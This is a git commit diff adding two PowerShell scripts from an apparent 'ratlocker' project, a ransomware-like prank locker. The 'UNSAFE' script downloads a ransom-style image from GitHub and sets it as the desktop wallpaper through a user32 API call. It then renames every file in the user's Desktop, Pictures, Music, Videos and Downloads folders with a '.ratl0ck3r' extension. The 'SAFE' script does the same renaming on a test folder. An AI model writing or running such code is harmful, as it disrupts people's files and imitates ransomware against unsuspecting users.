cbd296ed0169ac4b1e936c85450c8cb2971556dd
WalkTheEarth <152687463+WalkTheEarth@users.noreply.github.com>
2024-03-25 16:39:34 +0000

    wah ah

---
+++ LOCKED SAFE VER.ps1
@@ -0,0 +1,4 @@
+﻿Copy-Item "$HOME\AppData\Roaming\Microsoft\Windows\Themes\TranscodedWallpaper" -Destination C:\Users\marha\AppData\Local\Temp\YourOldWallpaper.png
+Invoke-WebRequest https://raw.githubusercontent.com/WalkTheEarth/ratlocker/main/RatLocker.png -OutFile C:\Users\marha\AppData\Local\Temp\RatLocker.png
+$MyWallpaper="C:\Users\marha\AppData\Local\Temp\RatLocker.png"
+dir $HOME\VIRTUALDESKTOP | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
---
+++ LOCKED UNSAFE VER.ps1
@@ -0,0 +1,22 @@
+﻿Copy-Item "$HOME\AppData\Roaming\Microsoft\Windows\Themes\TranscodedWallpaper" -Destination C:\Users\marha\AppData\Local\Temp\YourOldWallpaper.png
+Invoke-WebRequest https://raw.githubusercontent.com/WalkTheEarth/ratlocker/main/RatLocker.png -OutFile C:\Users\marha\AppData\Local\Temp\RatLocker.png
+$MyWallpaper="C:\Users\marha\AppData\Local\Temp\RatLocker.png"
+$code = @'
+using System.Runtime.InteropServices;
+namespace Win32{
+      public class Wallpaper{
+      [DllImport("user32.dll", CharSet=CharSet.Auto)]
+      static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;
+      public static void SetWallpaper(string thePath){
+      SystemParametersInfo(20,0,thePath,3);
+      }
+    }
+}
+'@
+add-type $code 
+[Win32.Wallpaper]::SetWallpaper($MyWallpaper)
+dir $HOME\Desktop\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
+dir $HOME\Pictures\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
+dir $HOME\Music\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
+dir $HOME\Videos\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
+dir $HOME\Downloads\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
